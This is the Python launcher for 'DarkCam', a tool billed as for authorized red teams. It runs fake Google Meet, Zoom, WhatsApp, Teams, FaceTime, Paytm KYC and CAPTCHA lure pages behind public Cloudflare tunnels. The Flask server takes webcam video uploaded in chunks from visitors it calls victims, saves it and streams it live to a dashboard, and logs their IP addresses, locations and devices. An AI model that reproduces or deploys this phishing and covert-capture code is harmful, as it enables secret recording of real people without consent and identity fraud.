#!/usr/bin/env python3
"""
DarkCam — Webcam Video Capture Tool for Authorized Red Team Engagements
Usage: python3 darkcam.py [--page meet|zoom|...] [--all] [--port 8080]
"""

# gevent monkey-patch must happen before ANY other imports
from gevent import monkey
monkey.patch_all()

import os
import sys
import time
import argparse
import subprocess
import threading
import signal
import re

_G = "\033[38;5;196m"   # neon red
_O = "\033[38;5;208m"   # neon orange
_W = "\033[38;5;255m"   # bright white
_D = "\033[38;5;240m"   # dim grey
_B = "\033[1m"          # bold
_R = "\033[0m"          # reset
_C = "\033[38;5;39m"    # cyan blue
_Y = "\033[38;5;226m"   # yellow

IS_TERMUX = "com.termux" in os.environ.get("PREFIX", "") or \
            os.path.exists("/data/data/com.termux")
PREFIX     = os.environ.get("PREFIX", "/usr")
BIN_DIR    = os.path.join(PREFIX, "bin")

ALL_PAGES  = ["meet","zoom","whatsapp","instagram","omegle","teams",
              "telegram","facetime","instagram_verify","google_verify","paytm_kyc","captcha"]

# ── Categories ────────────────────────────────────────────────
CATEGORIES = {
    "1": {
        "label": "📹  Video Call Pages",
        "desc":  "Fake video/audio call interfaces",
        "pages": [
            ("meet",      "📹", "Google Meet",        "Fake meeting join screen"),
            ("zoom",      "💻", "Zoom",               "Waiting for host UI"),
            ("whatsapp",  "📱", "WhatsApp",           "Incoming call from 'Rahul Sharma'"),
            ("instagram", "📸", "Instagram",          "Live video call with LIVE badge"),
            ("omegle",    "🌐", "Omegle",             "Random stranger video chat"),
            ("teams",     "🟣", "Microsoft Teams",    "Corporate meeting — fake ID & Passcode"),
            ("telegram",  "✈️ ", "Telegram",           "Incoming call with pulsing avatar"),
            ("facetime",  "🍎", "FaceTime",           "Full-screen iOS-style call + PiP"),
        ]
    },
    "2": {
        "label": "🔐  Face Verification Pages",
        "desc":  "KYC / account verification lures",
        "pages": [
            ("instagram_verify", "📸", "Instagram Verify", "Unusual activity — face scan + oval frame"),
            ("google_verify",    "🔵", "Google Verify",    "New device login — identity confirm"),
            ("paytm_kyc",        "💙", "Paytm KYC",        "Wallet limited — Full KYC + Aadhaar match"),
            ("captcha",          "🛡️ ", "Cloudflare CAPTCHA","Bot check lure — 'Verify you are human'"),
        ]
    },
    "3": {
        "label": "🚀  All Pages Simultaneously",
        "desc":  f"Launch all {len(ALL_PAGES)} lures with parallel tunnels",
        "pages": []
    },
}

BANNER = f"""
{_G} ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀{_O}  ▄████▄   ▄▄▄       ███▄ ▄███▓{_R}
{_G} ▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ {_O} ▒██▀ ▀█  ▒████▄    ▓██▒▀█▀ ██▒{_R}
{_G} ░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ {_O} ▒▓█    ▄ ▒██  ▀█▄  ▓██    ▓██░{_R}
{_G} ░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ {_O} ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██    ▒██ {_R}
{_G} ░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄{_O} ▒ ▓███▀ ░ ▓█   ▓██▒▒██▒   ░██▒{_R}
{_G}  ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒{_O} ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ░  ░{_R}
{_G}  ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░{_O}   ░  ▒     ▒   ▒▒ ░░  ░      ░{_R}
{_G}  ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░ {_O} ░          ░   ▒   ░      ░   {_R}
{_G}    ░          ░  ░   ░     ░  ░   {_O} ░ ░             ░  ░       ░   {_R}
{_G}  ░                                {_O} ░                               {_R}

{_D}        ┌──────────────────────────────────────────────────────────────┐{_R}
{_D}        │{_R}  {_O}{_B}🎥 DarkCam{_R}  {_D}•{_R}  {_W}Webcam Video Capture Framework{_R}  {_D}•{_R}  {_G}v1.1.0{_R}   {_D}│{_R}
{_D}        │{_R}  {_W}Developed by{_R} {_O}{_B}Yaman.RedTeam{_R}  {_D}•{_R}  {_G}Authorized Testing Only{_R}      {_D}│{_R}
{_D}        │{_R}  {_D}➜{_R} {_W}github.com/Yaman-RedTeam/darkcam{_R}  {_D}•{_R}  {_W}12 Lure Pages{_R}          {_D}│{_R}
{_D}        └──────────────────────────────────────────────────────────────┘{_R}
"""

def clear():
    os.system("clear" if os.name != "nt" else "cls")

def print_step(n, total, title):
    bar = _G + "━" * n + _D + "━" * (total - n) + _R
    print(f"\n  {bar}")
    print(f"  {_D}Step {n}/{total}{_R}  {_O}{_B}{title}{_R}\n")

def ask(prompt, default=None):
    hint = f" [{_C}{default}{_R}]" if default is not None else ""
    try:
        val = input(f"  {_O}❯{_R} {_W}{prompt}{hint}: {_R}").strip()
    except (KeyboardInterrupt, EOFError):
        print(f"\n\n  {_O}[!]{_R} Aborted.\n")
        sys.exit(0)
    return val if val else str(default) if default is not None else ""

def separator(w=58):
    print(f"  {_D}{'─' * w}{_R}")

# ─────────────────────────────────────────────────────────────
# STEP 1 — Choose category
# ─────────────────────────────────────────────────────────────
def step_category():
    print_step(1, 3, "Select Lure Category")
    for key, cat in CATEGORIES.items():
        print(f"  {_O}{_B}[{key}]{_R}  {_W}{cat['label']}{_R}")
        print(f"        {_D}{cat['desc']}{_R}\n")
    separator()
    choice = ask("Enter choice", "1")
    if choice not in CATEGORIES:
        print(f"\n  {_O}[!]{_R} Invalid choice. Defaulting to 1.")
        choice = "1"
    return choice

# ─────────────────────────────────────────────────────────────
# STEP 2 — Choose lure page (skipped for --all mode)
# ─────────────────────────────────────────────────────────────
def step_page(cat_key):
    if cat_key == "3":
        return None  # all mode

    cat = CATEGORIES[cat_key]
    pages = cat["pages"]

    print_step(2, 3, f"Select Lure Page  —  {cat['label']}")
    for i, (slug, icon, name, desc) in enumerate(pages, 1):
        idx = f"{_O}{_B}[{i}]{_R}"
        print(f"  {idx}  {icon}  {_W}{name:<22}{_R}  {_D}{desc}{_R}")
    print()
    separator()
    choice = ask("Enter choice", "1")
    try:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(pages):
            raise ValueError
    except ValueError:
        print(f"\n  {_O}[!]{_R} Invalid. Defaulting to 1.")
        idx = 0
    return pages[idx][0]  # return slug

# ─────────────────────────────────────────────────────────────
# STEP 3 — Configure & launch
# ─────────────────────────────────────────────────────────────
def step_config(cat_key, page_slug):
    is_all = (cat_key == "3")

    if is_all:
        label = f"ALL {len(ALL_PAGES)} PAGES"
    else:
        # find label
        for pages in [CATEGORIES["1"]["pages"], CATEGORIES["2"]["pages"]]:
            for slug, icon, name, _ in pages:
                if slug == page_slug:
                    label = f"{icon}  {name}"
                    break

    print_step(3, 3, "Configure & Launch")
    print(f"  {_D}Selected :{_R}  {_O}{_B}{label}{_R}")
    print()

    port_default = 8080
    port_str = ask("Port", port_default)
    try:
        port = int(port_str)
    except ValueError:
        port = port_default

    tunnel_ans = ask("Enable Cloudflare tunnel? (y/n)", "y").lower()
    no_tunnel = tunnel_ans in ("n", "no")

    duration_str = ask("Recording duration (seconds)", 45)
    try:
        duration = int(duration_str)
    except ValueError:
        duration = 45

    separator()
    print(f"\n  {_D}Summary:{_R}")
    print(f"  {_D}  Lure     :{_R}  {_O}{label}{_R}")
    print(f"  {_D}  Port     :{_R}  {port}")
    print(f"  {_D}  Tunnel   :{_R}  {'Yes' if not no_tunnel else 'No (local only)'}")
    print(f"  {_D}  Duration :{_R}  {duration}s per victim\n")

    confirm = ask("Launch? (y/n)", "y").lower()
    if confirm not in ("y", "yes", ""):
        print(f"\n  {_O}[!]{_R} Cancelled.\n")
        sys.exit(0)

    return port, no_tunnel, duration

# ─────────────────────────────────────────────────────────────

def install_deps():
    req_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "requirements.txt")
    print(f"  {_O}[*]{_R} Checking dependencies...")
    if IS_TERMUX:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "-r", req_path, "-q"],
            capture_output=True
        )
    else:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "-r", req_path, "-q", "--break-system-packages"],
            capture_output=True
        )
        if result.returncode != 0:
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", "-r", req_path, "-q"],
                capture_output=True
            )
    if result.returncode != 0:
        print(f"  {_O}[!]{_R} Dep install warning: {result.stderr.decode()[:200]}")

def check_cloudflared():
    result = subprocess.run(["which", "cloudflared"], capture_output=True)
    if result.returncode != 0:
        print(f"{_O}  [!] cloudflared not found. Installing...{_R}")
        arch = subprocess.check_output(["uname", "-m"], text=True).strip()
        if IS_TERMUX:
            try:
                subprocess.run(["pkg", "install", "-y", "cloudflared"], check=True)
                print(f"{_G}  [+] cloudflared installed via pkg.{_R}")
                return
            except Exception:
                pass
            binary = "cloudflared-linux-arm64"
            dest = os.path.join(BIN_DIR, "cloudflared")
        else:
            binary = "cloudflared-linux-arm64" if ("arm" in arch or "aarch" in arch) else "cloudflared-linux-amd64"
            dest = "/usr/local/bin/cloudflared"
        subprocess.run(
            f"curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/{binary} "
            f"-o {dest} && chmod +x {dest}",
            shell=True, check=True
        )
        print(f"{_G}  [+] cloudflared installed.{_R}")

def start_tunnel(port):
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )
    url = None

    def read_stderr():
        nonlocal url
        for line in proc.stderr:
            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if match:
                url = match.group(0)
                break

    t = threading.Thread(target=read_stderr, daemon=True)
    t.start()
    t.join(timeout=25)
    return url, proc

def start_flask(page, port):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    from flask import Flask, render_template, request, jsonify
    from flask_socketio import SocketIO, emit, join_room
    import json, datetime

    OUTPUT_DIR = os.path.join(script_dir, "output")
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    app = Flask(f"darkcam_{page}", template_folder=os.path.join(script_dir, "templates"))

    @app.route("/")
    def index():
        return render_template(f"{page}.html")

    @app.route("/live")
    def live():
        return render_template("live.html")

    @app.route("/log", methods=["POST"])
    def log():
        data = request.get_json(silent=True) or {}
        ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
        ua = request.headers.get("User-Agent", "unknown")
        entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "ip": ip, "user_agent": ua, "lure": page, **data}
        log_path = os.path.join(OUTPUT_DIR, "victims.log")
        with open(log_path, "a") as f:
            f.write(json.dumps(entry) + "\n")
        g = data.get("geo", {})
        print(f"\n  {_G}[+]{_R} [{page.upper()}] Victim: {ip} | {g.get('city','?')}, {g.get('country','?')} | {g.get('org','?')}")
        return jsonify({"status": "ok"})

    @app.route("/upload", methods=["POST"])
    def upload():
        sid = request.args.get("sid", "unknown")
        chunk = request.args.get("chunk", "0")
        video_dir = os.path.join(OUTPUT_DIR, sid)
        os.makedirs(video_dir, exist_ok=True)
        data = request.get_data()
        if not data:
            return jsonify({"status": "empty"}), 400
        with open(os.path.join(video_dir, f"chunk_{chunk.zfill(5)}.webm"), "wb") as f:
            f.write(data)
        print(f"  {_O}[*]{_R} [{page.upper()}] Chunk {chunk} from {sid} ({len(data)} bytes)")
        return jsonify({"status": "ok"})

    @app.route("/finalize", methods=["POST"])
    def finalize():
        sid = request.args.get("sid", "unknown")
        video_dir = os.path.join(OUTPUT_DIR, sid)
        if not os.path.exists(video_dir):
            return jsonify({"status": "no chunks"}), 404
        chunks = sorted(f for f in os.listdir(video_dir) if f.startswith("chunk_"))
        if not chunks:
            return jsonify({"status": "no chunks"}), 404
        final_path = os.path.join(OUTPUT_DIR, f"{sid}.webm")
        with open(final_path, "wb") as out:
            for c in chunks:
                with open(os.path.join(video_dir, c), "rb") as f:
                    out.write(f.read())
        for c in chunks:
            os.remove(os.path.join(video_dir, c))
        os.rmdir(video_dir)
        size_kb = os.path.getsize(final_path) // 1024
        print(f"\n  {_G}[+]{_R} [{page.upper()}] Video saved: output/{sid}.webm ({size_kb} KB)\n")
        return jsonify({"status": "saved", "file": f"{sid}.webm"})

    import logging
    logging.getLogger("werkzeug").setLevel(logging.ERROR)

    sio = SocketIO(app, cors_allowed_origins="*", async_mode="gevent",
                   logger=False, engineio_logger=False)

    @sio.on("join_dashboard")
    def _join_dash():
        join_room("dashboard")
        emit("dashboard_ready", {"msg": "ok"})

    @sio.on("victim_join")
    def _victim_join(data):
        lure = data.get("lure", page)
        ip   = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
        geo  = data.get("geo", {})
        info = {"sid": data.get("sid","?"), "lure": lure, "ip": ip,
                "city": geo.get("city","?"), "country": geo.get("country","?"),
                "isp": geo.get("org","?"), "ua": data.get("ua","?"),
                "time": datetime.datetime.utcnow().strftime("%H:%M:%S")}
        print(f"\n  {_G}[LIVE]{_R} [{page.upper()}] {ip} — {geo.get('city','?')}, {geo.get('country','?')}")
        sio.emit("victim_connected", info, room="dashboard")

    @sio.on("live_chunk")
    def _live_chunk(data):
        sio.emit("stream_chunk", data, room="dashboard")

    @sio.on("victim_done_sock")
    def _victim_done(data):
        sio.emit("victim_done", data, room="dashboard")

    def run():
        sio.run(app, host="0.0.0.0", port=port,
                debug=False, use_reloader=False, log_output=False,
                allow_unsafe_werkzeug=True)

    t = threading.Thread(target=run, daemon=True)
    t.start()
    time.sleep(1.2)

def start_flask_single(page, port):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    sys.path.insert(0, script_dir)
    import server as srv
    srv.app.config["LURE_PAGE"] = page

    def run():
        srv.socketio.run(srv.app, host="0.0.0.0", port=port,
                         debug=False, use_reloader=False, log_output=False,
                         allow_unsafe_werkzeug=True)

    t = threading.Thread(target=run, daemon=True)
    t.start()
    time.sleep(1.5)

def print_info(url, page, port, duration):
    env_label = f"{_O}Termux (Android){_R}" if IS_TERMUX else f"{_W}Linux{_R}"
    live_url  = url.replace("https://","https://") + "/live" if url.startswith("http") else f"http://localhost:{port}/live"
    print(f"\n{_D}  ┌──────────────────────────────────────────────────────┐{_R}")
    print(f"{_D}  │{_R}  {_O}{_B}🎥 DARKCAM ACTIVE{_R}                                      {_D}│{_R}")
    print(f"{_D}  ├──────────────────────────────────────────────────────┤{_R}")
    print(f"{_D}  │{_R}  {_D}Platform    :{_R}  {env_label}")
    print(f"{_D}  │{_R}  {_D}Lure Page   :{_R}  {_O}{page.upper()}{_R}")
    print(f"{_D}  │{_R}  {_D}Local URL   :{_R}  http://localhost:{port}")
    print(f"{_D}  │{_R}  {_D}Public URL  :{_R}  {_W}{url}{_R}")
    print(f"{_D}  │{_R}  {_D}Live Dash   :{_R}  {_C}{live_url}{_R}")
    print(f"{_D}  │{_R}  {_D}Output Dir  :{_R}  {os.path.abspath('output/')}")
    print(f"{_D}  │{_R}  {_D}Rec Duration:{_R}  {duration}s per victim")
    print(f"{_D}  └──────────────────────────────────────────────────────┘{_R}")
    print(f"\n  {_O}[!]{_R} Waiting for victims... (Ctrl+C to stop)\n")
    print(f"  {_D}{'─'*54}{_R}")

def print_all_info(results, duration):
    env_label = f"{_O}Termux (Android){_R}" if IS_TERMUX else f"{_W}Linux{_R}"
    w = 62
    print(f"\n{_D}  ┌{'─'*w}┐{_R}")
    print(f"{_D}  │{_R}  {_O}{_B}🎥 DARKCAM — ALL PAGES ACTIVE{_R}{' '*29}{_D}│{_R}")
    print(f"{_D}  ├{'─'*w}┤{_R}")
    print(f"{_D}  │{_R}  {_D}Platform    :{_R}  {env_label}")
    print(f"{_D}  │{_R}  {_D}Output Dir  :{_R}  {os.path.abspath('output/')}")
    print(f"{_D}  │{_R}  {_D}Rec Duration:{_R}  {duration}s per victim")
    print(f"{_D}  ├{'─'*w}┤{_R}")
    print(f"{_D}  │{_R}  {'PAGE':<22} {'PORT':<7} {'PUBLIC URL'}{' '*20}{_D}│{_R}")
    print(f"{_D}  ├{'─'*w}┤{_R}")
    for page, port, url in results:
        if url:
            short = url.replace("https://","")
            line = f"  {_O}{page:<22}{_R} {_D}{port:<7}{_R} {_G}{short}{_R}"
        else:
            line = f"  {_O}{page:<22}{_R} {_D}{port:<7}{_R} {_W}[tunnel failed]{_R}"
        print(f"{_D}  │{_R} {line}")
    print(f"{_D}  └{'─'*w}┘{_R}")
    print(f"\n  {_O}[!]{_R} All pages live! Ctrl+C to stop.\n")
    print(f"  {_D}{'─'*66}{_R}")

def run_all_mode(base_port, duration, no_tunnel):
    tunnel_procs = []
    results = []

    print(f"\n  {_O}[*]{_R} Launching {len(ALL_PAGES)} Flask servers...")
    for i in range(len(ALL_PAGES)):
        subprocess.run(f"kill $(lsof -ti:{base_port+i}) 2>/dev/null", shell=True)
    time.sleep(0.5)
    flask_threads = []
    for i, page in enumerate(ALL_PAGES):
        port = base_port + i
        t = threading.Thread(target=start_flask, args=(page, port), daemon=True)
        t.start()
        flask_threads.append(t)
    for t in flask_threads:
        t.join()
    for i, page in enumerate(ALL_PAGES):
        print(f"  {_G}[+]{_R} {page:<22} → http://localhost:{base_port+i}")

    if not no_tunnel:
        print(f"\n  {_O}[*]{_R} Starting {len(ALL_PAGES)} cloudflared tunnels (this takes ~30s)...")
        tunnel_threads = []
        tunnel_results = [None] * len(ALL_PAGES)

        def get_tunnel(idx, port):
            url, proc = start_tunnel(port)
            tunnel_results[idx] = (url, proc)

        for i, page in enumerate(ALL_PAGES):
            port = base_port + i
            t = threading.Thread(target=get_tunnel, args=(i, port), daemon=True)
            t.start()
            tunnel_threads.append(t)

        for t in tunnel_threads:
            t.join(timeout=35)

        for i, page in enumerate(ALL_PAGES):
            port = base_port + i
            res = tunnel_results[i]
            if res:
                url, proc = res
                tunnel_procs.append(proc)
                results.append((page, port, url))
                status = _G + "✓" + _R if url else _O + "✗" + _R
                print(f"  [{status}] {page:<22} {url or 'FAILED'}")
            else:
                results.append((page, port, None))
                print(f"  [{_O}✗{_R}] {page:<22} FAILED")
    else:
        for i, page in enumerate(ALL_PAGES):
            port = base_port + i
            results.append((page, port, f"http://localhost:{port}"))

    print_all_info(results, duration)
    return tunnel_procs

def interactive_menu():
    """Step-by-step interactive lure selector. Returns (page, port, no_tunnel, duration, is_all)."""
    clear()
    print(BANNER)

    if IS_TERMUX:
        print(f"  {_O}[*]{_R} Termux environment detected.\n")

    # Step 1 — category
    cat_key = step_category()
    is_all  = (cat_key == "3")

    # Step 2 — page
    page = step_page(cat_key)

    # Step 3 — config
    port, no_tunnel, duration = step_config(cat_key, page)

    return page, port, no_tunnel, duration, is_all

def main():
    parser = argparse.ArgumentParser(description="DarkCam — Webcam Video Capture Tool", add_help=True)
    parser.add_argument("--page", choices=ALL_PAGES, help="Skip menu: use this lure page directly")
    parser.add_argument("--all", action="store_true", help="Skip menu: launch ALL pages simultaneously")
    parser.add_argument("--port", type=int, default=8080, help="Base port (default 8080)")
    parser.add_argument("--duration", type=int, default=45, help="Recording duration in seconds")
    parser.add_argument("--no-tunnel", action="store_true", help="Skip cloudflared, use local only")
    args = parser.parse_args()

    # ── If flags provided, skip the menu (legacy / scripted use) ──
    if args.page or args.all:
        print(BANNER)
        if IS_TERMUX:
            print(f"  {_O}[*]{_R} Termux environment detected.")
        install_deps()
        if not args.no_tunnel:
            check_cloudflared()
        page      = args.page or "meet"
        port      = args.port
        no_tunnel = args.no_tunnel
        duration  = args.duration
        is_all    = args.all
    else:
        # ── Interactive menu ──
        page, port, no_tunnel, duration, is_all = interactive_menu()
        print()
        install_deps()
        if not no_tunnel:
            check_cloudflared()

    tunnel_procs = []

    # ── ALL MODE ──
    if is_all:
        tunnel_procs = run_all_mode(port, duration, no_tunnel)

    # ── SINGLE MODE ──
    else:
        subprocess.run(f"kill $(lsof -ti:{port}) 2>/dev/null", shell=True)
        time.sleep(0.3)
        print(f"  {_G}[+]{_R} Starting Flask server on port {port}...")
        start_flask_single(page, port)
        print(f"  {_G}[+]{_R} Flask server running.")

        public_url = f"http://localhost:{port}"
        if not no_tunnel:
            print(f"  {_O}[*]{_R} Starting cloudflared tunnel...")
            public_url, proc = start_tunnel(port)
            if not public_url:
                print(f"  {_G}[-]{_R} Could not get tunnel URL. Use --no-tunnel for local only.")
                sys.exit(1)
            tunnel_procs.append(proc)

        print_info(public_url, page, port, duration)

    def cleanup(sig=None, frame=None):
        print(f"\n\n  {_O}[!]{_R} Shutting down DarkCam...")
        for proc in tunnel_procs:
            try:
                proc.terminate()
            except Exception:
                pass
        print(f"  {_G}[+]{_R} DarkCam stopped. Captured files saved in: output/")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
